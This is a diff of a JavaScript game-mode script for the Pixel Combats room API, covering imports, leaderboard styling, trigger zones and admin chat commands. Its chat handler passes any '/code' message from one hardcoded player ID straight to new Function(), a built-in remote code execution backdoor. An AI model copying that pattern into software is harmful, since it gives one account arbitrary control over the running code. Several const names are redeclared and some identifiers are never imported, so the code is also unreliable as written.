@@ -1,4 +1,4 @@
-import { Players, Inventory, GameMode, Game, Teams, Spawns, Build, Timers, TeamsBalancer, BuildBlocksSet, Properties, LeaberBoard, AreaPlayerTriggerService, AreaViewService, room } from 'pixel_combats/room';
+import { Players, Inventory, GameMode, Game, Map, Chat, Teams, Spawns, Build, Timers, TeamsBalancer, BuildBlocksSet, Properties, LeaberBoard, AreaPlayerTriggerService, AreaViewService, room } from 'pixel_combats/room';
 import { DisplayValueHeader, Color } from 'pixel_combats/basic';
 try {
 	
@@ -53,7 +53,7 @@ Teams.OnRequestJoinTeam.Add(function (p,t) { t.Add(p); p.Properties.Get('RoomID'
 Teams.OnPlayerChangeTeam.Add(function (p) { p.Spawns.Spawn()});
 	
 // * Задаём значения в лидерборде, которые обязательно нужно вводить в таблицу. * //
-Room.LeaderBoard.PlayerLeaderBoardValues = [
+LeaderBoard.PlayerLeaderBoardValues = [
   new DisplayValueHeader('Kills', '<b><size=30><color=#be5f1b>K</color><color=#b65219>i</color><color=#ae4517>l</color><color=#a63815>l</color><color=#9e2b13>s</color></size></b>', '<b><size=30><color=#be5f1b>K</color><color=#b65219>i</color><color=#ae4517>l</color><color=#a63815>l</color><color=#9e2b13>s</color></size></b>'),
   new DisplayValueHeader('Deaths', '<b><size=30><color=#be5f1b>D</color><color=#b85519>e</color><color=#b24b17>a</color><color=#ac4115>t</color><color=#a63713>h</color><color=#a02d11>s</color></size></b>', '<b><size=30><color=#be5f1b>D</color><color=#b85519>e</color><color=#b24b17>a</color><color=#ac4115>t</color><color=#a63713>h</color><color=#a02d11>s</color></size></b>'),
   new DisplayValueHeader('Spawns', '<b><size=30><color=#be5f1b>S</color><color=#b85519>p</color><color=#b24b17>a</color><color=#ac4115>w</color><color=#a63713>n</color><color=#a02d11>s</color></size></b>', '<b><size=30><color=#be5f1b>S</color><color=#b85519>p</color><color=#b24b17>a</color><color=#ac4115>w</color><color=#a63713>n</color><color=#a02d11>s</color></size></b>'),
@@ -261,17 +261,16 @@ function SpawnTeams() {
  for (const t of Teams) Spawns.GetContext(t).Spawn();
 }
 
-// 
-
-Room.Chat.OnMessage.Add(function(Message) {
-	let MessageText = Message.Text.trim(), MessageSender = Room.Players.GetByRoomId(Message.Sender);
-	if (MessageText.toLowerCase().replaceAll(' ', '')[0] !== '/' || !MessageSender) return;
-	if (MessageSender.id !== '2827CD16AE7CC982') return;
-	let MessageLowerTextWithoutSpaces = MessageText.toLowerCase().replaceAll(' ', '');
-	if (MessageLowerTextWithoutSpaces.slice(1, 5) === 'code') {
-		try {
-			new Function(MessageText.slice(5))();
-		} catch (e) {
+// * Чат команды. * //
+Chat.OnMessage.Add(function (m) {
+ let MessageText = m.Text.trim(), MessageSender = Players.GetByRoomId(m.Sender);
+ if (MessageText.toLowerCase().replaceAll(' ', '')[0] !== '/' || !MessageSender) return;
+ if (MessageSender.id !== '2827CD16AE7CC982') return;
+ let MessageLowerTextWithoutSpaces = MessageText.toLowerCase().replaceAll(' ', '');
+ if (MessageLowerTextWithoutSpaces.slice(1, 5) === 'code') {
+try {
+	new Function(MessageText.slice(5))();
+ } catch (e) {
 			MessageSender.PopUp(`Ошибка (e)!\n Имя (e.name): \'${e.name}\',\n Сообщение (e.message): \'${e.message}\',\n Стек (e.stack.trim()): \'${e.stack.trim()}\'.`);
 		}
 		return;
@@ -364,16 +363,16 @@ Room.Chat.OnMessage.Add(function(Message) {
 			MessageSender.PopUp(`Команда: \'${MessageText}\' не была выполнена (ошибка). Причина: Игрок с RoomID аргумент №1 находится вне команд.`);
 			return;
 		}
-		ArgumentativePlayer.inventory.Main.Value = false;
-		ArgumentativePlayer.inventory.Secondary.Value = false;
-		ArgumentativePlayer.inventory.Melee.Value = false;
-		ArgumentativePlayer.inventory.Explosive.Value = false;
-		ArgumentativePlayer.inventory.Build.Value = false;
+		ArgumentativePlayer.Inventory.Main.Value = false;
+		ArgumentativePlayer.Inventory.Secondary.Value = false;
+		ArgumentativePlayer.Inventory.Melee.Value = false;
+		ArgumentativePlayer.Inventory.Explosive.Value = false;
+		ArgumentativePlayer.Inventory.Build.Value = false;
 		MessageSender.PopUp(`Команда: \'${MessageText}\' была выполнена успешно. У игрока с RoomID аргумент №1 был очищен инвентарь.`);
 	}
 });
 
-var ExplosiveTrigger = Room.AreaPlayerTriggerService.Get('ExplosiveTrigger');
+const ExplosiveTrigger = Room.AreaPlayerTriggerService.Get('ExplosiveTrigger');
 ExplosiveTrigger.Tags = ['ExplosiveTriggerPlus'];
 ExplosiveTrigger.Enable = true;
 ExplosiveTrigger.OnEnter.Add(function(p) {
@@ -392,7 +391,7 @@ p.Ui.Hint.Reset();
 p.Spawns.Spawn();
 });
 
-var SecondaryTrigger = Room.AreaPlayerTriggerService.Get('SecondaryTrigger');
+const SecondaryTrigger = Room.AreaPlayerTriggerService.Get('SecondaryTrigger');
 SecondaryTrigger.Tags = ['SecondaryTriggerPlus'];
 SecondaryTrigger.Enable = true;
 SecondaryTrigger.OnEnter.Add(function(p) {
@@ -411,7 +410,7 @@ p.Ui.Hint.Reset();
 p.Spawns.Spawn();
 });
 
-var MainTrigger = Room.AreaPlayerTriggerService.Get('MainTrigger');
+const MainTrigger = Room.AreaPlayerTriggerService.Get('MainTrigger');
 MainTrigger.Tags = ['MainTriggerPlus'];
 MainTrigger.Enable = true;
 MainTrigger.OnEnter.Add(function(p) {
@@ -430,7 +429,7 @@ p.Ui.Hint.Reset();
 p.Spawns.Spawn();
 });
 
-var Hp100Trigger = Room.AreaPlayerTriggerService.Get('100HpTrigger');
+const Hp100Trigger = Room.AreaPlayerTriggerService.Get('100HpTrigger');
 Hp100Trigger.Tags = ['MaxHp100TriggerPlus'];
 Hp100Trigger.Enable = true;
 Hp100Trigger.OnEnter.Add(function(p) {
@@ -445,7 +444,7 @@ p.Ui.Hint.Reset();
 p.Spawns.Spawn();
 });
 
-var Hp10Trigger = Room.AreaPlayerTriggerService.Get('10HpTrigger');
+const Hp10Trigger = Room.AreaPlayerTriggerService.Get('10HpTrigger');
 Hp10Trigger.Tags = ['MaxHp10TriggerPlus'];
 Hp10Trigger.Enable = true;
 Hp10Trigger.OnEnter.Add(function(p) {
@@ -460,23 +459,23 @@ p.Ui.Hint.Reset();
 p.Spawns.Spawn();
 });	
 
-var MainTrigger = Room.AreaViewService.GetContext().Get('MainTrigger');
+const MainTrigger = Room.AreaViewService.GetContext().Get('MainTrigger');
 MainTrigger.Tags = ['MainTriggerPlus'];
 MainTrigger.Enable = true;
 MainTrigger.Color = new Basic.Color(125/255, 0, 0, 0);
-var SecondaryTrigger = Room.AreaViewService.GetContext().Get('SecondaryTrigger');
+const SecondaryTrigger = Room.AreaViewService.GetContext().Get('SecondaryTrigger');
 SecondaryTrigger.Tags = ['SecondaryTriggerPlus'];
 SecondaryTrigger.Enable = true;
 SecondaryTrigger.Color = new Basic.Color(0, 0, 125/255, 0);
-var ExplosiveTrigger = Room.AreaViewService.GetContext().Get('ExplosiveTrigger');
+const ExplosiveTrigger = Room.AreaViewService.GetContext().Get('ExplosiveTrigger');
 ExplosiveTrigger.Tags = ['ExplosiveTriggerPlus'];
 ExplosiveTrigger.Enable = true;
 ExplosiveTrigger.Color = new Basic.Color(0.5, 125/255, 125/255, 0);
-var Hp10Trigger = Room.AreaViewService.GetContext().Get('Hp10Trigger');
+const Hp10Trigger = Room.AreaViewService.GetContext().Get('Hp10Trigger');
 Hp10Trigger.Tags = ['MaxHp10TriggerPlus'];
 Hp10Trigger.Enable = true;
 Hp10Trigger.Color = new Basic.Color(0.5, 0, 0, 0);
-var Hp100Trigger = Room.AreaViewService.GetContext().Get('Hp100Trigger');
+const Hp100Trigger = Room.AreaViewService.GetContext().Get('Hp100Trigger');
 Hp100Trigger.Tags = ['MaxHp100TriggerPlus'];
 Hp100Trigger.Enable = true;
 Hp100Trigger.Color = new Basic.Color(0.5, 0, 0, 0);
@@ -535,10 +534,10 @@ function GetPlayerInformation(p) {
         }
 }
 
-ScoresTimer.RestartLoop(IntervalTimer_SCORES);
+ScoresTimer.RestartLoop(ScoresINTERVALtime);
 
 } catch (e) {
-        Room.Players.All.forEach(msg => {
-                Room.msg.Show(`${e.name}: ${e.message} ${e.stack}`);
-        });
+        for (const p of Players.All) {
+                p.PopUp(`${e.name}: ${e.message} ${e.stack}`);
+        }
 	}
